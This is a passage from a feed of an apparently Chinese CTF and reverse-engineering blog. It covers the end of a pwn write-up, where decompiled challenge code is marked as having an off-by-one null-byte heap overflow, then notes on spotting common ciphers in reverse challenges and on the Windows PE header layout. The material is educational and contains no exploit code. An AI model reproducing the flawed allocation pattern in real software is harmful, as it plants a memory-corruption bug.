class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v4 = &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        heap[v2] = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Data:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)size));		&lt;span class=&#34;comment&#34;&gt;//一字节溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *v0 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;alloc error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Too large!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;allocate 函数里存在 off_by_one 的 null 溢出。&lt;/p&gt;
&lt;p&gt;程序并没有输出的功能。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</guid>
            <title>逆向常见算法</title>
            <link>http://example.com/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</link>
            <category>reverse</category>
            <pubDate>Thu, 12 May 2022 18:58:05 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;reverse-常见的加密算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reverse-常见的加密算法&#34;&gt;#&lt;/a&gt; Reverse 	常见的加密算法&lt;/h1&gt;
&lt;p&gt;在 reverse 的题目中，常常会对我们的输入以及内存数据进行加密，然后与已有的密文进行对比，从而判断我们的输入是否正确&lt;/p&gt;
&lt;h2 id=&#34;基于特征值识别的加密算法desaest系列md5sm4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基于特征值识别的加密算法desaest系列md5sm4&#34;&gt;#&lt;/a&gt; 基于特征值识别的加密算法：DES，AES，T 系列，md5,sm4&lt;/h2&gt;
&lt;p&gt;ida pro 插件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BvbHltb3JmL2ZpbmRjcnB5dC15YXJh&#34;&gt;https://github.com/polymorf/findcrpyt-yara&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;t系列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#t系列&#34;&gt;#&lt;/a&gt; T 系列&lt;/h3&gt;
&lt;h4 id=&#34;teaxteaxxtea&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#teaxteaxxtea&#34;&gt;#&lt;/a&gt; TEA，XTEA，XXTEA&lt;/h4&gt;
&lt;p&gt;有一个明确的特征值，然后对明文进行一些基本的算数运算&lt;/p&gt;
&lt;h3 id=&#34;aes块加密算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#aes块加密算法&#34;&gt;#&lt;/a&gt; AES—— 块加密算法&lt;/h3&gt;
&lt;p&gt;有一个固定的 256 字节的数组&lt;/p&gt;
&lt;p&gt;sbox [256] 的数组（用于矩阵运算的密钥）, 但是密钥不一定在程序中定义，可能是通过算法函数生成。这里也是出题人常用的出题思路 —— 修改 sbox。&lt;/p&gt;
&lt;p&gt;AES 基于单个块的加密，一次处理 4 个字节的数据&lt;/p&gt;
&lt;h3 id=&#34;rc4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rc4&#34;&gt;#&lt;/a&gt; RC4&lt;/h3&gt;
&lt;p&gt;通过一个 key，生成一个 sbox，再由 sbox 生成一个 keystream，明文与 keystream 亦或得到明文&lt;/p&gt;
&lt;h3 id=&#34;md5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5&#34;&gt;#&lt;/a&gt; MD5&lt;/h3&gt;
&lt;p&gt;有 4 个固定的 32bit 的值&lt;/p&gt;
&lt;h3 id=&#34;sm4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sm4&#34;&gt;#&lt;/a&gt; SM4&lt;/h3&gt;
&lt;p&gt;有一个固定的 256 字节的数组&lt;/p&gt;
&lt;h3 id=&#34;des&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#des&#34;&gt;#&lt;/a&gt; DES&lt;/h3&gt;
&lt;p&gt;有一个固定的 64 字节的数组&lt;/p&gt;
&lt;h3 id=&#34;第三方库加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三方库加密&#34;&gt;#&lt;/a&gt; 第三方库加密&lt;/h3&gt;
&lt;p&gt;调用第三方的库函数，对数据进行加密。这时候我们需要去寻找对应的加密函数的调用信息，dll，so 文件提供的 api。也有可能是使用的网络上开源的加密算法。&lt;/p&gt;
&lt;h2 id=&#34;加密算法的模式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#加密算法的模式&#34;&gt;#&lt;/a&gt; 加密算法的模式&lt;/h2&gt;
&lt;h3 id=&#34;分组加密模式12常用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分组加密模式12常用&#34;&gt;#&lt;/a&gt; 分组加密模式（1，2 常用）&lt;/h3&gt;
&lt;h4 id=&#34;1电码本模式ecb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1电码本模式ecb&#34;&gt;#&lt;/a&gt; 1，电码本模式 ecb&lt;/h4&gt;
&lt;p&gt;将明文分成多个块，对每个块进行单独的加密，然后拼接成密文，解密的流程就是将加密快换成解密块&lt;/p&gt;
&lt;h4 id=&#34;2密码分组链接模式cbc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2密码分组链接模式cbc&#34;&gt;#&lt;/a&gt; 2，密码分组链接模式 CBC&lt;/h4&gt;
&lt;p&gt;将明文分组程多个明文块 plaintext，算法需要两个额外的值，initialization Vector (IV), 这是一个与明文块大小相同的数据块，用于与第一个 plaintext 进行亦或（初始化），得到中间的块，Block Cipher Encryption，然后 BCE 与 key 进行加密运算的带第一个密文块，Ciphertext。后面按照同样的流程，只不过不再是使用给出的 IV，而是将上一个密文块用作本次加密的 IV。&lt;/p&gt;
&lt;h4 id=&#34;3计算器模式ctr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3计算器模式ctr&#34;&gt;#&lt;/a&gt; 3，计算器模式 CTR&lt;/h4&gt;
&lt;h4 id=&#34;4密码反馈模式cfb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4密码反馈模式cfb&#34;&gt;#&lt;/a&gt; 4，密码反馈模式 CFB&lt;/h4&gt;
&lt;h4 id=&#34;5输出反馈模式ofb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5输出反馈模式ofb&#34;&gt;#&lt;/a&gt; 5，输出反馈模式 OFB&lt;/h4&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <title>滴水逆向_学习笔记</title>
            <link>http://example.com/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <category>逆向</category>
            <pubDate>Thu, 12 May 2022 10:10:58 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;20220512开始加速学习逆向以滴水逆向的教程为路线&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#20220512开始加速学习逆向以滴水逆向的教程为路线&#34;&gt;#&lt;/a&gt; 20220512 开始加速学习逆向，以滴水逆向的教程为路线。&lt;/h1&gt;
&lt;p&gt;下面的内容基于 32 位 pe 程序&lt;/p&gt;
&lt;h2 id=&#34;1进制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1进制&#34;&gt;#&lt;/a&gt; 1，进制&lt;/h2&gt;
&lt;p&gt;8 进制的 2-3.（32 位）&lt;/p&gt;
&lt;p&gt;010 - 011&lt;/p&gt;
&lt;p&gt;补码加法：0000 0000 0000 0000 0000 0000 0000 0010 +  1111 1111 1111 1111 1111 1111 1111 1101&lt;/p&gt;
&lt;p&gt;结果 17777777777…(8)&lt;/p&gt;
&lt;h2 id=&#34;2exe执行文件如何执行程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2exe执行文件如何执行程序&#34;&gt;#&lt;/a&gt; 2，EXE 执行文件如何执行程序&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/e9028542f2504e34b2dbe6706c8cbd79.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;什么是程序。什么是数据&lt;/p&gt;
&lt;p&gt;程序是数据与可执行代码的组合。&lt;/p&gt;
&lt;p&gt;PE 文件结构&lt;/p&gt;
&lt;h3 id=&#34;dos头&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dos头&#34;&gt;#&lt;/a&gt; dos 头&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IMAGE_DOS_HEADER&lt;/span&gt; &amp;#123;&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;// DOS .EXE header&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_magic;                     &lt;span class=&#34;comment&#34;&gt;// Magic number&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_cblp;                      &lt;span class=&#34;comment&#34;&gt;// Bytes on last page of file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_cp;                        &lt;span class=&#34;comment&#34;&gt;// Pages in file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_crlc;                      &lt;span class=&#34;comment&#34;&gt;// Relocations&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_cparhdr;                   &lt;span class=&#34;comment&#34;&gt;// Size of header in paragraphs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_minalloc;                  &lt;span class=&#34;comment&#34;&gt;// Minimum extra paragraphs needed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_maxalloc;                  &lt;span class=&#34;comment&#34;&gt;// Maximum extra paragraphs needed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_ss;                        &lt;span class=&#34;comment&#34;&gt;// Initial (relative) SS value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_sp;                        &lt;span class=&#34;comment&#34;&gt;// Initial SP value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_csum;                      &lt;span class=&#34;comment&#34;&gt;// Checksum&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_ip;                        &lt;span class=&#34;comment&#34;&gt;// Initial IP value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_cs;                        &lt;span class=&#34;comment&#34;&gt;// Initial (relative) CS value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_lfarlc;                    &lt;span class=&#34;comment&#34;&gt;// File address of relocation table&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_ovno;                      &lt;span class=&#34;comment&#34;&gt;// Overlay number&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_res[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;];                    &lt;span class=&#34;comment&#34;&gt;// Reserved words&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_oemid;                     &lt;span class=&#34;comment&#34;&gt;// OEM identifier (for e_oeminfo)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_oeminfo;                   &lt;span class=&#34;comment&#34;&gt;// OEM information; e_oemid specific&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    WORD   e_res2[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];                  &lt;span class=&#34;comment&#34;&gt;// Reserved words&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD   e_lfanew;                    &lt;span class=&#34;comment&#34;&gt;// File address of new exe header	0x3c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;DOS 头目前已经没有什么作用了，保留的目的是为了向下兼容 16 位程序&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220512103830333.png&#34; alt=&#34;image-20220512103830333&#34;&gt;&lt;/p&gt;
&lt;p&gt;0x3c 地址的数据是 0x000000d8,（windows 中，高地址在前。）这里指向的是数据存储的起点，但不是程序入口。这里指向的是 PE&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;iMAGE_NT_HEADERS&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	DWORD Signature&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x04&lt;/span&gt;	_iMAGE_FILE_HEADER FileHeader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;	_iMAGE_OPTIONAL_HEADER OptionalHeader&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;程序入口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#程序入口&#34;&gt;#&lt;/a&gt; 程序入口&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IMAGE_OPTIONAL_HEADER&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 Magic;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  BYTE                 MajorLinkerVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  BYTE                 MinorLinkerVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfCode;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfInitializedData;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfUninitializedData;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                AddressOfEntryPoint;			&lt;span class=&#34;comment&#34;&gt;//入口点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                BaseOfCode;					&lt;span class=&#34;comment&#34;&gt;//代码基址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                BaseOfData;					&lt;span class=&#34;comment&#34;&gt;//数据基址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                ImageBase;					&lt;span class=&#34;comment&#34;&gt;//镜像基址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SectionAlignment;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                FileAlignment;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MajorOperatingSystemVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MinorOperatingSystemVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MajorImageVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MinorImageVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MajorSubsystemVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 MinorSubsystemVersion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                Win32VersionValue;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfImage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfHeaders;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                CheckSum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 Subsystem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  WORD                 DllCharacteristics;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfStackReserve;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfStackCommit;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfHeapReserve;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                SizeOfHeapCommit;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                LoaderFlags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  DWORD                NumberOfRvaAndSizes;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;iMAGE_OPTIONAL_HEADER OptionalHeader   结构体紧跟在&lt;/em&gt;    iMAGE_NT_HEADERS 的后面。&lt;/p&gt;
&lt;p&gt;AddressOfEntryPoint 在结构体中的偏移是 0x10,&lt;/p&gt;
&lt;p&gt;上面的截图为例，入口点在 0x100h，数据是 0x00001307&lt;/p&gt;
&lt;p&gt;代码基址是 0x00001000, 数据段基址 0x00006000。这里我们通过 ida 分析发现，&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span 